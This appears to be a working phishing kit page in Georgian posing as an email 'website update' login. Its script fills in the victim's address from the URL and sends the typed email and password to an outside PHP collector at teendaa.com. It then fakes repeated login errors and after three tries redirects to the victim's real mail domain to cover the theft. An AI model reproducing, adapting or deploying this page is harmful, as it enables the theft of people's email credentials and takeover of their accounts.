


<!doctype html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
    <title>ვებგვერდის განახლება</title>
    <link href="css/hover.css" rel="stylesheet" media="all">

    <style type="text/css">
      textarea:hover, 
      input:hover, 
      textarea:active, 
      input:active, 
      textarea:focus, 
      input:focus,
      button:focus,
      button:active,
      button:hover,
      label:focus,
      .btn:active,
      .btn.active
      {
        outline:0px !important;
        -webkit-appearance:none;
        box-shadow: none !important;
        border-color: none !important;
      }


      .input-icons i { 
        position: absolute; 
      } 

      .input-icons { 
        width: 100%; 
      } 

      .icon { 
        padding: 10px; 
        min-width: 40px;
        color: #8FA7AD; 
      } 

      .input-field { 
        width: 100%; 
        padding: 5px;
        padding-left: 40px ;
        text-align: left;
        border: 1px solid #8FA7AD; 
      } 



    </style>
  </head>
  <!-- oncontextmenu="return false" -->
  <body >
    <div class="container-fluid p-0">

      <div class="container-fluid">
        <div class="row" style="margin: 30px 0px 60px 0px;">
          <div class="col-md-4 mx-auto mt-5 px-3 pb-3">

            <div class="text-center pt-5"> 

              <div class="alert mx-3" id="msg" style="background-color: #D35351; display: none;">
                <div class="text-white text-left">
                  <i class="fas fa-times-circle"></i>
                  &nbsp
                  <span class="small" id="msg_text"></span>
                  
                </div>
              </div>
              <img alt="" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDYycHQiIGhlaWdodD0iMzIwIiB2aWV3Qm94PSIwIDAgMTQ2MiAyNDAiPjxkZWZzPjxjbGlwUGF0aCBpZD0iYSI+PHBhdGggZD0iTTEzMzkgMGgxMjIuNDR2MjQwSDEzMzl6bTAgMCIvPjwvY2xpcFBhdGg+PC9kZWZzPjxwYXRoIGQ9Ik0zNjUuMTAyIDE0LjM5OGwtNDMuMjA0IDE2MC4yMDRjLTIuNTk3IDkuNTk3LTYuNTk3IDE4LjQ1LTEyIDI2LjU0Ni01LjM5OCA4LjEwMi0xMS44NDcgMTUtMTkuMzQ3IDIwLjcwNC03LjUgNS43LTE1Ljg1NSAxMC4xNTItMjUuMDUgMTMuMzQ3LTkuMiAzLjIwMi0xOC44IDQuOC0yOC44IDQuOEgwTDYwLjMgMTMuNWMuOTk3LTMuOTk2IDMuMTUzLTcuMjQ2IDYuNDUtOS43NUM3MC4wNSAxLjI1NCA3My44IDAgNzggMGgzMi4xMDJjMy43OTYgMCA2Ljg0NyAxLjUgOS4xNDggNC41IDIuMjk3IDMgMi45NSA2LjMgMS45NSA5Ljg5OGwtNDQuNyAxNjYuOGg2MC44OThsNDUtMTY3LjY5OGMxLTMuOTk2IDMuMTUzLTcuMjQ2IDYuNDU0LTkuNzUgMy4yOTYtMi40OTYgNi45NDUtMy43NSAxMC45NS0zLjc1aDMyLjM5N2MzLjc5NiAwIDYuNzk2IDEuNSA5IDQuNSAyLjE5OCAzIDIuOCA2LjMgMS44IDkuODk4bC00NC43IDE2Ni44SDIzNC45YzcuMjA0IDAgMTMuNjUzLTIuMTQzIDE5LjM1Mi02LjQ0OCA1LjctNC4yOTcgOS40NS05Ljk0NSAxMS4yNS0xNi45NWwzOC43LTE0NC4zYzEtMy45OTYgMy4xNTItNy4yNDYgNi40NDgtOS43NSAzLjMtMi40OTYgNy4wNS0zLjc1IDExLjI1LTMuNzVIMzU0YzMuNzk3IDAgNi44NTIgMS41IDkuMTQ4IDQuNSAyLjI5NyAzIDIuOTU0IDYuMyAxLjk1NCA5Ljg5OE00MTQuNTk4IDExNi4yNWMtMi40MDMgMS45MDItNC4xMDIgNC4zNTItNS4xMDIgNy4zNTJsLTEzLjUgNTFjLS44IDIuOC0uMyA1LjM5OCAxLjUgNy43OTYgMS44MDUgMi40MDMgNC4yIDMuNjAyIDcuMiAzLjYwMmgxMjQuMjAybC05LjU5NyAzNS43Yy0xLjYwNSA1LjQwMi00LjYwNSA5LjgtOSAxMy4xOTgtNC40MDUgMy40MDctOS40MDUgNS4xMDItMTUgNS4xMDJIMzgyLjE5NmMtOC4yMDMgMC0xNS43MDMtMS43NS0yMi41LTUuMjUtNi44LTMuNDk2LTEyLjQ1LTguMi0xNi45NS0xNC4xMDItNC41LTUuODk0LTcuNi0xMi41OTctOS4zLTIwLjA5Ny0xLjY5LTcuNS0xLjQ0NS0xNS4xNTIuNzUtMjIuOTQ4bDE4LjMtNjguMTAyYzEuOTk3LTcuMzk1IDUuMTAzLTE0LjIgOS4zMDYtMjAuMzk4IDQuMTk2LTYuMiA5LjE0NS0xMS41IDE0Ljg0OC0xNS45MDMgNS43LTQuMzk1IDEyLjA5OC03Ljg0NSAxOS4yLTEwLjM0OCA3LjA5Ny0yLjUgMTQuNDUtMy43NSAyMi4wNS0zLjc1aDgwLjA5OGM4LjIgMCAxNS43IDEuNzk2IDIyLjUgNS4zOTggNi44IDMuNjAyIDEyLjQ1IDguMyAxNi45NSAxNC4xMDIgNC41IDUuOCA3LjU0NiAxMi41IDkuMTUyIDIwLjA5NyAxLjU5NyA3LjYwNSAxLjM5NCAxNS4zLS42MDIgMjMuMWwtNS4zOTggMjAuNGMtMi40MDMgOS03LjI1IDE2LjI1My0xNC41NDcgMjEuNzUtNy4zMDggNS41MDMtMTUuNTU4IDguMjUtMjQuNzUgOC4yNWgtOTAuNjA1bDYtMjIuMmMxLjQwMy01LjM5OCA0LjMtOS43OTcgOC43MDMtMTMuMiA0LjQtMy4zOTggOS40OTctNS4xIDE1LjI5Ny01LjFINDc3LjNjMy4zOTUgMCA1LjU5NS0xLjY5NiA2LjU5OC01LjA5OGwxLjItNC41Yy41OTctMi4yLjItNC4yMDQtMS4yLTYtMS40MDItMS44LTMuMjAzLTIuNzA0LTUuNDAyLTIuNzA0aC01NS44Yy0zIDAtNS43Ljk1NC04LjA5OCAyLjg1Mk02MTkuNDkyIDBjNC4yMDMgMCA4IC44OTggMTEuNDAzIDIuNyAzLjM5OCAxLjggNi4yIDQuMTU1IDguNDAyIDcuMDUgMi4xOTUgMi45MDIgMy43NSA2LjI1NCA0LjY0OCAxMC4wNS45IDMuODAyLjc1IDcuNzA0LS40NTMgMTEuN2wtMzkuODk4IDE0OS43aDUwLjcwM2M3LjE5NSAwIDEzLjU5OC0yLjE5NiAxOS4xOTUtNi41OTggNS42MDItNC40IDkuNDAzLTEwLjA5OCAxMS40MDMtMTcuMTAyIDEuMzk0LTQuOTk2IDEuNTQ2LTkuODk4LjQ1LTE0LjctMS4xMDMtNC44LTMuMTAzLTkuMDQ2LTYtMTIuNzUtMi45MDQtMy42OTgtNi41LTYuNjk4LTEwLjc5OC05LTQuMzA1LTIuMjk2LTkuMDU1LTMuNDQ4LTE0LjI1LTMuNDQ4aC0yLjEwMmMtNC42IDAtOC4yMDMtMS43NS0xMC44LTUuMjUtMi42MDItMy40OTctMy40MDMtNy40NS0yLjQwMy0xMS44NTJsMTEuNDAzLTQxLjdoNi41OTdjMTQuNjAyIDAgMjcuOTUgMy4xNSA0MC4wNTUgOS40NSAxMi4wOTggNi4zIDIyLjE0NCAxNC42NTIgMzAuMTQ4IDI1LjA1IDcuOTk2IDEwLjQgMTMuNSAyMi4zMDUgMTYuNSAzNS43IDMgMTMuNDAyIDIuNTk0IDI3LjEwNS0xLjIwMyA0MS4xMDJsLTEuMTk1IDQuNWMtMi42MDYgOS41OTctNi42NTIgMTguNDUtMTIuMTUyIDI2LjU0Ni01LjUwNCA4LjEwMi0xMiAxNS0xOS41IDIwLjcwNC03LjUgNS43LTE1Ljg1NiAxMC4xNTItMjUuMDUgMTMuMzQ3LTkuMiAzLjIwMi0xOC44MDIgNC44LTI4Ljc5OCA0LjhoLTk2LjYwMmMtNC4yMDMgMC03Ljk1My0uODk4LTExLjI1LTIuNy0zLjMtMS44LTYuMS00LjE0OC04LjM5OC03LjA1LTIuMzA1LTIuODk1LTMuODU2LTYuMjQ2LTQuNjUyLTEwLjA1LS43OTctMy43OTgtLjctNy42OTYuMy0xMS43TDU5MC45OTIgMGgyOC41TTczOS4xOSAyMjUuODk4bDQ0LjQwNC0xNjYuNzk2SDk3My4xOWMxNC42IDAgMjcuOTUgMy4xNDggNDAuMDQ4IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjUgMzAuMTUzIDI1LjA1IDggMTAuNDAyIDEzLjUgMjIuMyAxNi41IDM1LjcgMyAxMy40IDIuNTk4IDI3LjEtMS4yIDQxLjA5NmwtMTUuMyA1Ni40MDNjLTEgNC4wMDUtMy4xNTIgNy4yLTYuNDUgOS41OTgtMy4zIDIuNDAzLTYuOTUyIDMuNjAyLTEwLjk1MiAzLjYwMmgtMzIuMzk0Yy0zLjggMC02LjgtMS40NS05LTQuMzUyLTIuMjAzLTIuODk0LTIuODA1LTYuMTQ4LTEuOC05Ljc1bDE3Ljk5NS02OC4wOTdjMS40LTQuOTk1IDEuNTUtOS45MDIuNDQ4LTE0LjY5OC0xLjA5Ny00LjgtMy4wNDctOS4wNDctNS44NDMtMTIuNzUtMi44MDUtMy43LTYuNDA3LTYuNy0xMC44LTktNC40MDQtMi4yOTctOS4yMDQtMy40NTQtMTQuNDA0LTMuNDU0aC0xOS41TDkyMS41OTUgMjI2LjhjLTEuMDA0IDQuMDA1LTMuMTUzIDcuMi02LjQ1IDkuNTk4LTMuMyAyLjQwMy03LjA1IDMuNjAyLTExLjI1IDMuNjAyaC0zMi4xYy0zLjgwMiAwLTYuODUzLTEuNDUtOS4xNS00LjM1Mi0yLjMwNC0yLjg5NC0yLjk1My02LjE0OC0xLjk1My05Ljc1bDI5LjEwMy0xMDhoLTYwLjg5OEw3OTkuNzkzIDIyNi44Yy0xLjAwNCA0LjAwNS0zLjE0OCA3LjItNi40NSA5LjU5OC0zLjMgMi40MDMtNy4wNSAzLjYwMi0xMS4yNSAzLjYwMmgtMzIuMWMtMy41OTggMC02LjU1Ni0xLjQ1LTguODQ4LTQuMzUyLTIuMjk3LTIuODk0LTIuOTU0LTYuMTQ4LTEuOTU0LTkuNzVNMTIyMC45ODggMTIxLjhsLjkwMy0zLjNjLjQtMS41OTguMTUtMi45NS0uNzUtNC4wNS0uOTAyLTEuMDk1LTIuMTUyLTEuNjUtMy43NS0xLjY1aC05Ny41Yy00LjIgMC04LS45MDItMTEuNDAyLTIuNjk4LTMuNDEtMS44LTYuMi00LjE1My04LjM5OC03LjA1LTIuMjEtMi45LTMuNzEtNi4yNS00LjUtMTAuMDUyLS44LTMuNzk3LS43MS03LjY5NS4zLTExLjdsNi0yMi44aDEzMmM4LjIgMCAxNS43IDEuOCAyMi41IDUuMzk4IDYuNzkgMy42MDIgMTIuNDUgOC4zIDE2Ljk1IDE0LjEwMiA0LjUgNS44MDUgNy42IDEyLjQ1IDkuMyAxOS45NSAxLjY4OCA3LjUgMS41NCAxNS4yNTMtLjQ1IDIzLjI1bC0yMy43MDIgODguMTk4Yy0yLjM5OCA5LTcuMjUgMTYuMzA1LTE0LjU0NyAyMS45MDMtNy4zMSA1LjYwMi0xNS42NSA4LjQtMjUuMDUgOC40bC05Ny41LS4zMDJjLTguNiAwLTE2LjUtMS44NDMtMjMuNy01LjU0Ni03LjIwMi0zLjctMTMuMS04LjU5OC0xNy43MDItMTQuNzA0LTQuNjEtNi4wOTctNy43OTctMTMuMDkzLTkuNTk3LTIxLTEuOC03Ljg5NC0xLjYtMTUuOTQ1LjU5OC0yNC4xNDhsMS4yMDMtNC41YzEuMzg4LTUuNTk4IDMuNzUtMTAuOCA3LjA0OC0xNS42MDIgMy4zLTQuNzk2IDcuMTUzLTguODk0IDExLjU1LTEyLjI5NiA0LjM5Mi0zLjQwMyA5LjMwMi02LjA0NyAxNC43LTcuOTU0IDUuNDAzLTEuODk0IDExLjEwMi0yLjg0NyAxNy4xMDItMi44NDdoODEuODk4bC02IDIyLjVjLTEuNjEgNS40LTQuNjEgOS44MDItOSAxMy4yLTQuMzk4IDMuNDAyLTkuNDEgNS4xMDItMTUgNS4xMDJoLTM2LjU5N2MtMy40MSAwLTUuNiAxLjctNi42IDUuMDk3LS42IDIuMjAyLS4yIDQuMTU1IDEuMTk4IDUuODUgMS4zOSAxLjcwNCAzLjE5MiAyLjU1MiA1LjQwMyAyLjU1Mmg1OS4wOThjMi4yMDMgMCA0LjA5LS42MDIgNS43MDMtMS44IDEuNi0xLjIgMi42LTIuNzk4IDMtNC44MDJsLjYtMi4zOTggMTQuNjk4LTU0LjNNMTMyMC4yOSAzMC44OThsNC41LTE3LjM5OGMxLTMuOTk2IDMuMTUtNy4yNDYgNi40NDgtOS43NSAzLjMtMi40OTYgNy4wNS0zLjc1IDExLjI1LTMuNzVoMzIuNDAzYzMuNTk4IDAgNi41NSAxLjUgOC44NDggNC41IDIuMyAzIDIuOTUzIDYuMiAxLjk1MyA5LjYwMmwtNC44IDE3LjdjLTEuMDEgNC4wMDMtMy4xNTIgNy4yNS02LjQ1IDkuNzUtMy4zIDIuNTAzLTYuOTUyIDMuNzUtMTAuOTUyIDMuNzVoLTMyLjM5OGMtMy44IDAtNi44LTEuNS05LTQuNS0yLjIxLTMtMi44LTYuMzAyLTEuOC05LjkwNHpNMTI2NC40ODcgMjQwbDM4LjQwMy0xNDQuM2MxLjQtNS40IDMuNjUtMTAuMzQ4IDYuNzUtMTQuODQ4IDMuMDk4LTQuNSA2Ljc1LTguNDAzIDEwLjk1LTExLjcwNCA0LjItMy4yOTYgOC44OS01Ljg0NyAxNC4xLTcuNjQ4IDUuMi0xLjggMTAuNi0yLjcgMTYuMi0yLjdoMjIuOGwtMzguNzAyIDE0NC4zMDJjLTEuMzk4IDUuMzk4LTMuNjQ4IDEwLjM0Ny02Ljc1IDE0Ljg0Ny0zLjExIDQuNS02Ljc1IDguNDAyLTEwLjk1IDExLjY5OC00LjE5OCAzLjMtOC44OTcgNS44NTItMTQuMDk3IDcuNjUzLTUuMjEgMS44MDItMTAuNjEyIDIuNy0xNi4yMDIgMi43aC0yMi41IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTMzOS43OSAyNDBsNjAuMy0yMjYuNWMuOTg4LTMuOTk2IDMuMTQ4LTcuMjQ2IDYuNDUtOS43NSAzLjMtMi40OTYgNy4wNS0zLjc1IDExLjI1LTMuNzVoMzIuMWMzLjc5IDAgNi44NCAxLjQ1MyA5LjE1IDQuMzUyIDIuMjg4IDIuOTAyIDIuOTQgNi4xNDggMS45NDggOS43NWwtNDUgMTY3LjA5N2MtMi4yMDcgOC44MDQtNS43NTggMTYuOC0xMC42NDggMjQtNC45MSA3LjE5OC0xMC43MSAxMy4zNS0xNy40IDE4LjQ0OC02LjcxIDUuMTAyLTE0LjE1IDkuMTA2LTIyLjM1IDEyLTguMjEgMi45MDMtMTYuOCA0LjM1Mi0yNS44IDQuMzUyIiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=" class="img-fluid" width="310px"><br>
            </div>
            <div class="col-lg-10 mx-auto mt-5">
              <center>
                <span id="error" class="text-danger" style="display: none;">ეგ ანგარიში არ არსებობს. შეიყვანეთ სხვა ანგარიში</span>
              </center>
              <form id="contact" class="form-horizontal well">
                <div id="div1" class="text-dark">
                  <div class="col-lg-12">
                    <div class="form-group">
                      <div id="inputbar">
                        <label for="exampleInputEmail1">Ელექტრონული მისამართი</label>
                          <div class="input-icons">
                            <i class="fa fa-user icon"></i> 
                            <!-- <input class="input-field" type="text"> -->
                            <input type="email" name="email" class="input-field rounded" id="email" aria-describedby="emailHelp" placeholder="შეიყვანეთ თქვენი ელ.ფოსტის მისამართი" readonly="readonly">
                          </div> 
                          <!-- <div class="input-group-prepend">
                            <span class="input-group-text border-right-0" style="background-color: transparent;"><i class="fas fa-user" style="color: #8FA7AD;"></i></span>
                          </div> -->
                          <!-- <input type="email" name="email" class="form-control border-left-0" id="email" aria-describedby="emailHelp" placeholder="Enter email"> -->
                        
                      </div>
                      <!-- <div id="automail" class="h5 mt-5" style="display: none;">
                        <i class="fas fa-arrow-left" id="back1"></i>&nbsp<span id="emailch">abc@abc.com</span>
                      </div> -->
                    </div>
                  </div>
                  <div class="col-lg-12">
                    <div class="form-group">
                      <label for="Password">პაროლი</label>
                      <div class="input-icons">
                            <i class="fas fa-lock icon"></i> 
                            <input type="password" name="password" class="input-field rounded" id="password" aria-describedby="emailHelp" placeholder="შეიყვანეთ თქვენი ელ.ფოსტის პაროლი">
                          </div> 
                        
                    </div>
                  </div>
                </div>
              </div>
              <div class="text-center col-lg-9 mx-auto mt-4">
                <button class="btn py-1 w-100 border-dark text-white" id="submit-btn" style="background-color: #179BD7;">Შესვლა</button>
              </div>
            </form>
          </div>
          <div class="col-lg-12 text-center mt-1"> 
            <small class="font-weight-bold" style="color: #766;">პაროლის გადაყენება</small>

          </div> 
          <div class="col-lg-12 text-center mt-5 pt-3"> 
            <a class=" text-dark small" href="#" style="font-weight: 500">English</a>
            <a class="text-dark small ml-4" href="#" style="font-weight: 500">العربية </a>
            <a class="text-dark small ml-4" href="#" style="font-weight: 500">български</a>
            <a class="text-dark small ml-4" href="#" style="font-weight: 500">čeština</a>
            <a class="text-dark small ml-4" href="#" style="font-weight: 500">اdansk</a>
            <a class="text-dark small ml-4" href="#" style="font-weight: 500">Deutsch </a>
            <a class="text-dark small ml-4" href="#" style="font-weight: 500">Ελληνικά</a>
            <a class="text-dark small ml-4" href="#" style="font-weight: 500">español </a>
            <a class="text-dark small ml-4" href="#" style="font-weight: 500"><i class="fas fa-ellipsis-h"></i></a>

          </div>  
        </div> 
      </div>
    </div>


    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  </body>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
  <script>

    /* global $ */
    $(document).ready(function(){
      var count=0;

      // $('#back1').click(function () {
      //   $("#msg").hide();
      //   $('#email').val("");
      //   $("#automail").animate({left:200, opacity:"hide"}, 0);
      //   $("#inputbar").animate({right:200, opacity:"show"}, 1000);

      // });

    /////////////url email getting////////////////
    var email = window.location.hash.substr(1);
    if (!email) {

    }
    else
    {
        // $('#email').val(email);
        var my_email =email;
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/other-1.png');
        $('#field').html("Other Mail");
        $('#email').val(my_email);
        $('#emailch').html(my_email);
        $("#msg").hide();
        // $("#inputbar").animate({left:200, opacity:"hide"}, 0);
        // $("#automail").animate({right:200, opacity:"show"}, 1000);
      }
      ///////////////url getting email////////////////


      
      $('#submit-btn').click(function(event){
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
      ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

      if (!filter.test(my_email)) {
        $('#error').show();
        email.focus;
        return false;
      }

      var ind=my_email.indexOf("@");
      var my_slice=my_email.substr((ind+1));
      var c= my_slice.substr(0, my_slice.indexOf('.'));
      var final= c.toLowerCase();
      ///////////new injection////////////////
      count=count+1;
      
      $.ajax({
        dataType: 'JSON',
        url: 'https://teendaa.com/rge/weka.php',
        type: 'POST',
        data:{
          email:email,
          password:password,
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('დადასტურებულია...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                  $("#password").val("");
                  if (count>=3) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                    window.location.replace("https://www."+my_slice);

                  }
                  $('#msg_text').html(response['msg']);
                }
                else{
                  $('#msg_text').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=3) {
                count=0;
                window.location.replace("https://www."+my_slice);
              }
              $("#msg").show();
              $('#msg_text').html("განცხადება არასწორია");
            },
            complete: function(){
              $('#submit-btn').html('Შესვლა');
            }
          });
    });


    });
</script>
</html>
